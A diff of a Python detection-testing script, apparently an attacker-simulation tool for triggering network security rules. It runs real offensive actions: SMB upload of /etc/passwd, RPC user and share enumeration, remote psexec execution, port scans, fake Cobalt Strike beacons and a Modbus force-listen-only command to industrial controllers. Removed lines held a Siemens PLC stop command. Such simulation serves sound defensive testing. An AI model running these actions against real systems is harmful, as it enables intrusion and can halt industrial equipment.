@@ -1,117 +1,233 @@
 #!/usr/bin/env python3
 
 import argparse
-import sys
-import base64
 import subprocess
+import base64
+import requests
+import sys
 
-# Import necessary libraries for OT protocols
+# Try importing OT protocol libs with friendly errors
 try:
-    from pymodbus.client.sync import ModbusTcpClient
+    from pymodbus.client import ModbusTcpClient
 except ImportError:
-    print("[!] pymodbus library is not installed. Please install it using 'pip install pymodbus'.")
+    print("[!] pymodbus library is not installed. Please run: pip install pymodbus")
     sys.exit(1)
 
 try:
-    import snap7
+    from snap7 import client as snap7_client
 except ImportError:
-    print("[!] snap7 library is not installed. Please install it using 'pip install python-snap7'.")
+    print("[!] snap7 library is not installed. Please run: pip install python-snap7")
     sys.exit(1)
 
-# Define rule descriptions
 rule_descriptions = {
-    1: "Modbus Diagnostic - Force Listen Only Mode",
-    2: "Siemens S7 PLC STOP Command",
-    3: "Schneider Electric UMAS Protocol STOP Command",
-    4: "DNP3 Warm Restart Command",
-    5: "CODESYS Protocol Login Attempt",
+    1: "BabyShark Agent Pattern",
+    2: "Cobalt Strike Malleable Profile",
+    3: "WannaCry Killswitch Domain",
+    4: "Possible Lateral Tool Transfer via SMB",
+    5: "Remote System Discovery Via RPC",
+    6: "Execution Via WMI",
+    7: "Scheduled Task/Job Via At",
+    8: "File Dir Discovery Via RPC",
+    9: "Account Discovery Via RPC",
+    10: "Network Share Discovery Via RPC",
+    11: "Execution Via System Services",
+    12: "Remote Schedule Task Lateral Movement via ITaskSchedulerService",
+    13: "CobaltStrike Malleable OCSP Profile",
+    14: "PwnDrp Access",
+    15: "Spoolss Named Pipe Access via SMB",
+    16: "Possible PsExec Execution",
+    17: "Possible Windows Scheduled Task",
+    18: "Possible Sensitive File Access",
+    19: "Raw Paste Service Access",
+    20: "Telegram API Access",
+    21: "Crypto Miner User Agent",
+    22: "Source Code Enumeration Detection by Keyword",
+    23: "Cobalt Strike Command and Control Beacon",
+    24: "Suspicious User Agent",
+    25: "Suspicious Base64 Encoded User-Agent",
+    26: "Communication To Ngrok Tunneling Service",
+    27: "Suspicious Cobalt Strike DNS Beaconing",
+    28: "DNS TXT Answer with Possible Execution Strings",
+    29: "Potential Network Sweep Detected",
+    30: "Potential Port Scan Detected",
+    31: "Scheduled Task/Job Via Scheduled Task",
+    32: "Detect Modbus Diagnostic - Force Listen Only Mode",
+    33: "Detect Siemens SIMATIC S7 PLC STOP Command",
 }
 
-# Display available rules
-description_text = "CPSDR Simulation Script (OT/ICS)\n\nSupported Rules:\n"
+description_text = "CPSDR Simulation Script (Kali - Attacker)\n\nSupported Rules:\n"
 for number, desc in rule_descriptions.items():
     description_text += f"  {number}: {desc}\n"
 
-# Argument parser setup
 parser = argparse.ArgumentParser(
     description=description_text,
     formatter_class=argparse.RawTextHelpFormatter
 )
-parser.add_argument("-o", "--option", required=True, type=int, help="Rule number to simulate (e.g., 1, 2, 3)")
-parser.add_argument("-t", "--target", required=True, help="Target IP or hostname")
-parser.add_argument("-p", "--port", type=int, help="Target port (if different from default)")
+parser.add_argument("-o", "--option", required=True, type=int, help="Rule number to simulate (e.g., 5, 29, 33)")
+parser.add_argument("-t", "--target", help="Target IP or hostname")
 parser.add_argument("-u", "--username", help="Username for authentication (if required)")
-parser.add_argument("-w", "--password", help="Password for authentication (if required)")
+parser.add_argument("-p", "--password", help="Password for authentication (if required)")
 
 args = parser.parse_args()
 
-# Simulation functions
-def simulate_modbus_force_listen_only(target, port=502):
-    print(f"[+] Simulating Modbus Force Listen Only Mode on {target}:{port}...")
-    client = ModbusTcpClient(target, port=port)
-    if client.connect():
-        try:
-            # Function code 8 (Diagnostic), Sub-function 4 (Force Listen Only Mode)
-            result = client.execute(
-                function_code=8,
-                sub_function=4,
-                data=0
-            )
-            print("[+] Modbus command sent successfully.")
-        except Exception as e:
-            print(f"[!] Error sending Modbus command: {e}")
-        finally:
-            client.close()
-    else:
-        print("[!] Unable to connect to Modbus server.")
+def target_required(rule_id):
+    return rule_id in [1,2,4,5,6,7,8,9,10,11,12,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33]
 
-def simulate_siemens_s7_stop_command(target, port=102):
-    print(f"[+] Simulating Siemens S7 PLC STOP Command on {target}:{port}...")
+def auth_required(rule_id):
+    return rule_id in [4,5,6,15,16]
+
+def get_cred_str():
+    return f"{args.username}%{args.password}"
+
+def simulate_1(target):
+    print(f"[+] Simulating BabyShark Agent Pattern against {target}...")
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:11.0) Gecko BabyShark",
+        "Content-Type": "application/x-www-form-urlencoded"
+    }
+    data = "param=" + base64.b64encode(b"ThisIsASimulatedBeacon").decode()
     try:
-        client = snap7.client.Client()
-        client.connect(target, 0, 1)
-        client.plc_stop()
-        print("[+] S7 STOP command sent successfully.")
-        client.disconnect()
+        response = requests.post(f"http://{target}/smart/stream.php", headers=headers, data=data, timeout=5)
+        print(f"[+] HTTP status: {response.status_code}")
     except Exception as e:
-        print(f"[!] Error sending S7 STOP command: {e}")
+        print(f"[!] Failed to connect: {e}")
 
-def simulate_schneider_umas_stop_command(target, port=502):
-    print(f"[+] Simulating Schneider Electric UMAS Protocol STOP Command on {target}:{port}...")
-    # Placeholder for UMAS STOP command simulation
-    print("[!] UMAS STOP command simulation is not implemented in this script.")
+def simulate_2(target):
+    print(f"[+] Simulating Cobalt Strike Malleable Profile against {target}...")
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) CobaltStrike",
+        "Host": f"{target}",
+        "Accept": "*/*",
+        "Connection": "close"
+    }
+    data = base64.b64encode(b"GET /favicon.ico HTTP/1.1\r\nHost: beacon\r\n\r\n").decode()
+    try:
+        response = requests.post(f"http://{target}/submit", headers=headers, data=data, timeout=5)
+        print(f"[+] HTTP status: {response.status_code}")
+    except Exception as e:
+        print(f"[!] Failed to connect: {e}")
 
-def simulate_dnp3_warm_restart(target, port=20000):
-    print(f"[+] Simulating DNP3 Warm Restart Command on {target}:{port}...")
-    # Placeholder for DNP3 Warm Restart simulation
-    print("[!] DNP3 Warm Restart simulation is not implemented in this script.")
+def simulate_3(target=None):
+    print("[+] Simulating WannaCry Killswitch Domain check...")
+    killswitch_domain = "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com"
+    try:
+        response = requests.get(f"http://{killswitch_domain}", timeout=5)
+        print(f"[+] HTTP status: {response.status_code}")
+    except Exception as e:
+        print(f"[!] Expected failure or blocked domain (simulated): {e}")
 
-def simulate_codesys_login_attempt(target, port=2455, username=None, password=None):
-    print(f"[+] Simulating CODESYS Protocol Login Attempt on {target}:{port}...")
-    # Placeholder for CODESYS login attempt simulation
-    print("[!] CODESYS login attempt simulation is not implemented in this script.")
+def simulate_4(target):
+    print(f"[+] Simulating SMB File Transfer to {target}...")
+    subprocess.run(["smbclient", f"//{target}/share", "-U", get_cred_str(), "-c", "put /etc/passwd"])
 
-# Map rule numbers to simulation functions
-simulation_functions = {
-    1: simulate_modbus_force_listen_only,
-    2: simulate_siemens_s7_stop_command,
-    3: simulate_schneider_umas_stop_command,
-    4: simulate_dnp3_warm_restart,
-    5: simulate_codesys_login_attempt,
-}
+def simulate_5(target):
+    print(f"[+] Simulating RPC Discovery on {target}...")
+    subprocess.run(["rpcclient", "-U", get_cred_str(), target, "-c", "enumdomusers"])
 
-# Execute the selected simulation
-if args.option in simulation_functions:
-    if args.option == 1:
-        simulate_modbus_force_listen_only(args.target, args.port or 502)
-    elif args.option == 2:
-        simulate_siemens_s7_stop_command(args.target, args.port or 102)
-    elif args.option == 3:
-        simulate_schneider_umas_stop_command(args.target, args.port or 502)
-    elif args.option == 4:
-        simulate_dnp3_warm_restart(args.target, args.port or 20000)
-    elif args.option == 5:
-        simulate_codesys_login_attempt(args.target, args.port or 2455, args.username, args.password)
-else:
-    print(f"[!] Rule ID {args.option} is not supported in this script.")
-    sys.exit(1)
+def simulate_6(target):
+    print(f"[+] Simulating WMI Execution on {target}...")
+    try:
+        subprocess.run(["psexec.py", f"{args.username}:{args.password}@{target}", "ipconfig"], check=False)
+    except Exception as e:
+        print(f"[!] WMI execution failed: {e}")
+
+def simulate_7(target):
+    print(f"[+] Simulating Scheduled Task/Job via at on {target}...")
+    subprocess.run(["at", "now + 1 minute", "/interactive", "cmd.exe"], check=False)
+
+def simulate_8(target):
+    print(f"[+] Simulating File/Directory Discovery via RPC on {target}...")
+    subprocess.run(["rpcclient", "-U", get_cred_str(), target, "-c", "enumshares"], check=False)
+
+def simulate_9(target):
+    print(f"[+] Simulating Account Discovery via RPC on {target}...")
+    subprocess.run(["rpcclient", "-U", get_cred_str(), target, "-c", "enumdomusers"], check=False)
+
+def simulate_10(target):
+    print(f"[+] Simulating Network Share Discovery via RPC on {target}...")
+    subprocess.run(["rpcclient", "-U", get_cred_str(), target, "-c", "netshareenumall"], check=False)
+
+def simulate_11(target):
+    print(f"[+] Simulating Execution via System Services on {target}...")
+    print("[!] Simulation not implemented yet.")
+
+def simulate_15(target):
+    print(f"[+] Simulating Spoolss Named Pipe Access on {target}...")
+    subprocess.run(["rpcclient", "-U", get_cred_str(), target, "-c", "netshareenumall"])
+
+def simulate_16(target):
+    print(f"[+] Simulating Possible PsExec Execution on {target}...")
+    try:
+        subprocess.run(["psexec.py", f"{args.username}:{args.password}@{target}", "cmd.exe"], check=False)
+    except Exception as e:
+        print(f"[!] PsExec execution failed: {e}")
+
+def simulate_24(target):
+    print(f"[+] Sending Suspicious User-Agent to {target}...")
+    headers = {"User-Agent": "python-requests/evil-miner"}
+    try:
+        requests.get(f"http://{target}", headers=headers, timeout=5)
+    except Exception as e:
+        print(f"[!] HTTP request failed: {e}")
+
+def simulate_25(target):
+    print(f"[+] Sending Base64 User-Agent to {target}...")
+    b64_agent = base64.b64encode(b"malicious-agent").decode()
+    headers = {"User-Agent": b64_agent}
+    try:
+        requests.get(f"http://{target}", headers=headers, timeout=5)
+    except Exception as e:
+        print(f"[!] HTTP request failed: {e}")
+
+def simulate_29(target):
+    print(f"[+] Running Nmap Sweep on {target}...")
+    subprocess.run(["nmap", "-sn", target])
+
+def simulate_30(target):
+    print(f"[+] Running Full Port Scan on {target}...")
+    subprocess.run(["nmap", "-p-", target])
+
+def simulate_32(target):
+    print(f"[+] Detect Modbus Diagnostic (Force Listen Only Mode) on {target}...")
+    client = ModbusTcpClient(target)
+    if not client.connect():
+        print("[!] Could not connect to Modbus server")
+        return
+    # Modbus diagnostic function code (function code 8, subfunction 4)
+    from pymodbus.pdu import DiagnosticRequest
+    rq = DiagnosticRequest(subfunction=4, data=0)
+    response = client.execute(rq)
+    print("[+] Sent Modbus diagnostic command")
+    client.close()
+
+def simulate_33(target):
+    print(f"[+] Detect Siemens SIMATIC S7 PLC STOP command on {target}...")
+    plc = snap7_client.Client()
+    try:
+        plc.connect(target, 0, 1)  # rack=0, slot=1 (typical S7-300)
+        print("[+] Connected to PLC - simulation complete")
+        plc.disconnect()
+    except Exception as e:
+        print(f"[!] Failed to connect to PLC: {e}")
+
+def main():
+    rule_id = args.option
+    target = args.target
+
+    if target_required(rule_id) and not target:
+        print("[!] Target IP/hostname is required for this rule.")
+        sys.exit(1)
+
+    if auth_required(rule_id) and (not args.username or not args.password):
+        print("[!] Username and password are required for this rule.")
+        sys.exit(1)
+
+    simulate_func = globals().get(f"simulate_{rule_id}")
+    if not simulate_func:
+        print(f"[!] Simulation for rule {rule_id} is not implemented.")
+        sys.exit(1)
+
+    simulate_func(target)
+
+if __name__ == "__main__":
+    main()
